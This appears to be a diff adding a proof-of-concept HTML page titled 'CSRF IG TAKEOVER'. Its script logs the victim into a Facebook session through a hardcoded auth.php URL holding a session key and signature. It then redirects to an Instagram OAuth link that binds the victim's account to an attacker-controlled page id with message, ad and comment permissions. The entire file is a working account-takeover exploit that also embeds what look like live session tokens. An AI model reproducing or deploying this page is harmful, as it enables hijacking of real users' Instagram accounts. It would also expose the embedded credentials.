@@ -1,1 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CSRF IG TAKEOVER</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+    background: #f4f4f4;
+  }
+  button {
+    padding: 12px 24px;
+    font-size: 16px;
+    background: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+  button:hover { background: #145dbf; }
+  #status {
+    margin-top: 20px;
+    color: #555;
+    font-size: 14px;
+  }
+</style>
+</head>
+<body>
 
+  <button onclick="runFlow()">CONNECT IG</button>
+  <div id="status">Click Start to open popup. It closes in 3s, then this page redirects.</div>
+
+  <script>
+	//ATTACKER_PAGE_ID
+	var delegate_page_id = "108230978873344";
+	
+	//CSRF_LOGIN_URL (Replace CSRF_LOGIN_URL)
+    const CSRF_LOGIN_URL    = "https://m.facebook.com/auth.php?api_key=882a8490361da98702bf97a021ddc14d&session_key=5.-p-PjnlfIB0DDQ.1781704696.14-100027551349493&sig=195c09891187ea1253a4167aade0eaea&t=1781704895&uid=100027551349493&url=https%3A%2F%2Fm.facebook.com%2Froot.php";
+	
+	//IG_OAUTH_LINK
+	const REDIRECT_URL = "https://www.instagram.com/oauth/authorize/?redirect_uri=https://m.facebook.com/page/instagram/sync/oauthlink/&app_id=17951132926087090&response_type=code&state={%22page_id%22:"+ delegate_page_id +",%22platform%22:%22msite%22,%22start_time%22:0,%22from%22:%22profile_plus_settings%22,%22nonce%22:%22ssssssssssssssss%22,%22permissions%22:[%22manage_messages%22,%22manage_ads%22,%22manage_comments%22],%22is_ig_link_confirmation_flow%22:false,%22is_ig_business_conversion_flow%22:false,%22terms_of_service%22:9,%22mbs_only_push_notifications%22:false,%22custom_full_redirect_uri%22:%22https:\/\/m.facebook.com\/page\/instagram\/sync\/oauthlink\/%22,%22require_professional%22:false,%22category_id%22:null,%22logging_data%22:{%22entry_point%22:%22profile_plus_settings%22,%22link_flow_source%22:%22fb_app%22,%22flow_type%22:%22linking%22,%22event_location%22:%22nt_ap_plus_connect_to_ig_disclosure_screen%22,%22page_id%22:"+ delegate_page_id +"},%22is_link_request_flow%22:true}&force_authentication=0&platform_app_id=17951132926087090";
+    const statusEl = document.getElementById("status");
+
+    function runFlow() {
+      statusEl.textContent = "Opening popup...";
+
+      const popup = window.open(
+        CSRF_LOGIN_URL,
+        "fbPopup",
+        "width=400,height=300,left=100,top=100,resizable=yes,scrollbars=yes"
+      );
+
+      if (!popup) {
+        statusEl.textContent = "❌ Popup blocked. Please allow popups for this site.";
+        return;
+      }
+
+      statusEl.textContent = "Popup opened. Closing in 3s...";
+
+      setTimeout(() => {
+        try { popup.close(); } catch (e) { console.warn("Close blocked:", e); }
+        statusEl.textContent = "Redirecting...";
+        window.location.replace(REDIRECT_URL);
+      }, 2000);
+    }
+  </script>
+
+</body>
+</html>
